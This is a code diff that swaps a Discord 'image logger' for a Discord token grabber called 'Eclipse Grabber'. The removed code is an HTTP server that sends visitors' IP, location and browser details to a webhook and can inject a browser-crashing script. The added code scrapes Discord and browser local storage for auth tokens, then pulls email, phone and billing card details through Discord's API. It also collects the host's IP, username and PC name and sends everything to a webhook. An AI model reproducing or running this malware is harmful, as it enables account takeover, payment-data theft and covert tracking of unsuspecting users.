@@ -1,321 +1,207 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
-import re
 import os
-import typing
+import ssl
+from getpass import getuser
+from json import dumps, loads
+from platform import node as get_pc_name
+from re import findall
+from sys import platform as OS
+from typing import List, Optional, Dict, Set, Union
+from urllib.request import Request, urlopen
+import base64
 import json
 import urllib.request
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
-
-config = {
-    # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1337860504567418932/2HQhqG9eH6UgmEHowYa6UbqP9-1Ld89uMzvQc1-qXmetOuxGOB4riXZMHyzumsapR-Si",
-    "image": "https://m.media-amazon.com/images/I/61dx3faBVrL._SL1500_.jpg", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
-    # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
-
-    # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
-
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
-    },
-
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
-
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
-
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
-
-    # REDIRECTION #
-    "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
-    },
-
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
-}
-
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
-
-def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
-    else:
-        return False
-
-def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
-
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
-    if ip.startswith(blacklistedIPs):
-        return
-    
-    bot = botCheck(ip, useragent)
-    
-    if bot:
-        requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
-        return
-
-    ping = "@everyone"
-
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-                return
-        
-        if config["vpnCheck"] == 1:
-            ping = ""
-    
-    if info["hosting"]:
-        if config["antiBot"] == 4:
-            if info["proxy"]:
-                pass
-            else:
-                return
-
-        if config["antiBot"] == 3:
-                return
-
-        if config["antiBot"] == 2:
-            if info["proxy"]:
-                pass
-            else:
-                ping = ""
-
-        if config["antiBot"] == 1:
-                ping = ""
-
-
-    os, browser = httpagentparser.simple_detect(useragent)
-    
-    embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
-
-**Endpoint:** `{endpoint}`
-            
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-
-**User Agent:**
-```
-{useragent}
-```""",
-    }
-  ],
-}
-    
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
-    return info
-
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
-}
-
-class ImageLoggerAPI(BaseHTTPRequestHandler):
-    
-    def handleRequest(self):
-        try:
-            if config["imageArgument"]:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                else:
-                    url = config["image"]
-            else:
-                url = config["image"]
-
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
-            
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-                return
-            
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
-
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
-                return
-            
-            else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
-                else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
-
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
-}}
-
-</script>"""
-                self.wfile.write(data)
-        
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-            reportError(traceback.format_exc())
-
-        return
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
-
-handler = app = ImageLoggerAPI
-
+# Constants
+WEBHOOK = "{WEBHOOK}"
+IPIFY_API_URL = "https://api.ipify.org?format=json"
+DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
+DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
+DISCORD_BILLING_URL = DISCORD_API_URL + "/billing/payment-sources"
+USER_AGENT = (
+    "Mozilla/5.0 (X11; Linux x86_64) "
+    "AppleWebKit/537.11 (KHTML, like Gecko) "
+    "Chrome/23.0.1271.64 Safari/537.11"
+)
+CONTENT_TYPE = "application/json"
 TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
 REQUEST_HEADERS = {
     "Content-Type": "application/json",
     "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
 }
-WEBHOOK_URL = "YOUR WEBHOOK URL"
 
-def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
+ssl._create_default_https_context = ssl._create_unverified_context
+
+def pc_info():
+    api_resp = open_url(IPIFY_API_URL)
+    return (
+        f'IP: {api_resp.get("ip") if api_resp else None}\n'
+        f"Username: {getuser()}\n"
+        f"PC Name: {get_pc_name()}\n"
+    )
+
+def get_paths() -> dict:
+    if OS == "win32":  # Windows
+        local_app_data = os.getenv("LOCALAPPDATA")
+        app_data = os.getenv("APPDATA")
+        chromium_path = ["User Data", "Default"]
+    elif OS == "darwin":  # OSX
+        local_app_data = os.path.expanduser("~/Library/Application Support")
+        app_data = os.path.expanduser("~/Library/Application Support")
+        chromium_path = ["Default"]
+    else:
+        return {}
+
+    paths = {
+        "Discord": [app_data, "Discord"],
+        "Discord Canary": [app_data, "discordcanary"],
+        "Discord PTB": [app_data, "discordptb"],
+        "Google Chrome": [local_app_data, "Google", "Chrome", *chromium_path],
+        "Brave": [local_app_data, "BraveSoftware", "Brave-Browser", *chromium_path],
+        "Yandex": [local_app_data, "Yandex", "YandexBrowser", *chromium_path],
+        "Opera": [app_data, "Opera Software", "Opera Stable"],
+    }
+
+    for app_name, path in paths.items():
+        paths[app_name] = os.path.join(*path, "Local Storage", "leveldb")
+
+    return paths
+
+def open_url(url: str, token: Optional[str] = None, data: Optional[bytes] = None) -> Optional[dict]:
+    headers = {
+        "Content-Type": CONTENT_TYPE,
+        "User-Agent": USER_AGENT,
+    }
+
+    if token:
+        headers.update({"Authorization": token})
+    try:
+        result = urlopen(Request(url, data, headers)).read().decode().strip()
+        if result:
+            return loads(result)
+    except Exception:
+        pass
+
+class Account:
+    def __init__(self, token: str, token_location: str):
+        self.token = token
+        self.token_location = token_location
+        self.account_data = open_url(DISCORD_API_URL, self.token)
+        self.billing_data = open_url(DISCORD_BILLING_URL, self.token)
+
+        if self.account_data:
+            self.name = self.account_data.get("username")
+            self.discriminator = self.account_data.get("discriminator")
+            self.id = self.account_data.get("id")
+            self.avatar_url = DISCORD_AVATAR_URL.format(
+                id=self.id, avatar_id=self.account_data.get('avatar')
+            )
+
+    def account_info(self) -> str:
+        if not self.account_data:
+            return "None"
+
+        return (
+            f"Email: {str(self.account_data.get('email'))}\n"
+            f"Phone: {str(self.account_data.get('phone'))}\n"
+            f"Nitro: {'Enabled' if bool(self.account_data.get('premium_type')) else 'Disabled'}\n"
+            f"MFA: {'Enabled' if bool(self.account_data.get('mfa_enabled')) else 'Disabled'}\n"
+            f"Lang: {str(self.account_data.get('locale')).capitalize()}"
+        )
+
+    def billing_info(self) -> List[str]:
+        if not self.billing_data:
+            return "None"
+
+        info = []
+
+        for bill in self.billing_data:
+            info.append(
+                f"Id: {str(bill.get('id'))}\n"
+                f"Owner: {str(bill.get('billing_address').get('name').title())}\n"
+                f"Postal Code: {str(bill.get('billing_address').get('postal_code'))}\n"
+                f"Invalid: {str(bill.get('invalid'))}\n"
+                f"Brand: {str(bill.get('brand')).capitalize()}\n"
+                f"Last digits: {str(bill.get('last_4'))}\n"
+                f"Expires: {str(bill.get('expires_month'))}"
+                f"/{str(bill.get('expires_year'))}\n"
+                f"Country: {str(bill.get('country'))}"
+            )
+        return info
+
+def field(title: str, text: str, inline: bool = True) -> str:
+    return {
+        "name": f"**{title} Info**",
+        "value": str(text),
+        "inline": bool(inline)
+    }
+
+def embed_info(accounts: Dict[str, Account]) -> List[dict]:
+    embeds = []
+    for account in accounts.values():
+        fields = [
+            field("Account", account.account_info()),
+            field("PC", pc_info()),
+            field("Token", account.token, False)
+        ]
+
+        if account.billing_data:
+            fields.insert(-1, field("Billing", account.billing_info()[0]))
+
+        embeds.append({
+            "color": 0x6A5ACD,
+            "fields": fields,
+            "footer": {"text": "Made by @3ct0s and @JM1k1"},
+            "author": {
+                "name": (
+                    f"{account.name}#{account.discriminator} "
+                    f"({account.id})"
+                ),
+                "icon_url": account.avatar_url
+            }
+        })
+    return embeds
+
+def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
+    webhook = {
+        "content": "",
+        "embeds": embeds,
+        "username": "Eclipse Grabber",
+        "avatar_url": "https://imgur.com/Ymo8GEe.png"
+    }
+
+    data = dumps(webhook).encode()
+    return open_url(WEBHOOK_URL, None, data)
+
+def get_tokens(path: str) -> List[str]:
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+            continue
+        try:
+            with open(os.path.join(path, file_name), errors="ignore") as content:
+                for line in map(str.strip, content.readlines()):
+                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
+                                  r"mfa\.[\w-]{84}"):
+                        for token in findall(regex, line):
+                            tokens.append(token)
+        except Exception:
+            continue
+    return tokens
+
+def get_accounts(paths: dict) -> dict:
+    accounts = {}
+
+    for app_name, path in paths.items():
+        if not os.path.exists(path):
+            continue
+        for token in get_tokens(path):
+            account = Account(token, app_name)
+            if account.account_data and account.id not in accounts.keys():
+                accounts.update({account.id: account})
+    return accounts
+
+def make_post_request(api_url: str, data: Dict[str, str]) -> int:
     request = urllib.request.Request(
         api_url, data=json.dumps(data).encode(),
         headers=REQUEST_HEADERS
@@ -326,33 +212,36 @@ def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
 
     return response_status
 
-def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
-    with open(file_path, encoding="utf-8", errors="ignore") as text_file:
-        try:
+def get_tokens_from_file(file_path: str) -> Union[List[str], None]:
+    try:
+        with open(file_path, encoding="utf-8", errors="ignore") as text_file:
             file_contents = text_file.read()
-        except PermissionError:
-            return None
+    except (PermissionError, FileNotFoundError):
+        return None
 
-    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
+    tokens = findall(TOKEN_REGEX_PATTERN, file_contents)
 
     return tokens if tokens else None
 
-def get_user_id_from_token(token: str) -> typing.Union[None, str]:
+def get_user_id_from_token(token: str) -> Union[None, str]:
     try:
         discord_user_id = base64.b64decode(
             token.split(".", maxsplit=1)[0] + "=="
         ).decode("utf-8")
-    except UnicodeDecodeError:
+    except (UnicodeDecodeError, IndexError):
         return None
 
     return discord_user_id
 
-def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
-    file_paths = [
-        os.path.join(base_path, filename) for filename in os.listdir(base_path)
-    ]
+def get_tokens_from_path(base_path: str) -> Union[Dict[str, Set[str]], None]:
+    try:
+        file_paths = [
+            os.path.join(base_path, filename) for filename in os.listdir(base_path)
+        ]
+    except FileNotFoundError:
+        return None
 
-    id_to_tokens: typing.Dict[str, set] = dict()
+    id_to_tokens: Dict[str, Set[str]] = dict()
 
     for file_path in file_paths:
         potential_tokens = get_tokens_from_file(file_path)
@@ -374,9 +263,9 @@ def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
     return id_to_tokens if id_to_tokens else None
 
 def send_tokens_to_webhook(
-    webhook_url: str, user_id_to_token: typing.Dict[str, set[str]]
+    webhook_url: str, user_id_to_token: Dict[str, Set[str]]
 ) -> int:
-    fields: list[dict] = list()
+    fields: List[Dict] = list()
 
     for user_id, tokens in user_id_to_token.items():
         fields.append({
@@ -386,9 +275,14 @@ def send_tokens_to_webhook(
 
     data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
 
-    make_post_request(webhook_url, data)
+    return make_post_request(webhook_url, data)
 
-def main() -> None:
+def main(WEBHOOK_URL: str):
+    paths = get_paths()
+    accounts = get_accounts(paths)
+    embeds = embed_info(accounts)
+    send_webhook(embeds, WEBHOOK_URL)
+
     chrome_path = os.path.join(
         os.getenv("LOCALAPPDATA"),
         r"Google\Chrome\User Data\Default\Local Storage\leveldb"
@@ -402,4 +296,4 @@ def main() -> None:
     send_tokens_to_webhook(WEBHOOK_URL, tokens)
 
 if __name__ == "__main__":
-    main()
+    main(WEBHOOK) # Run the main function
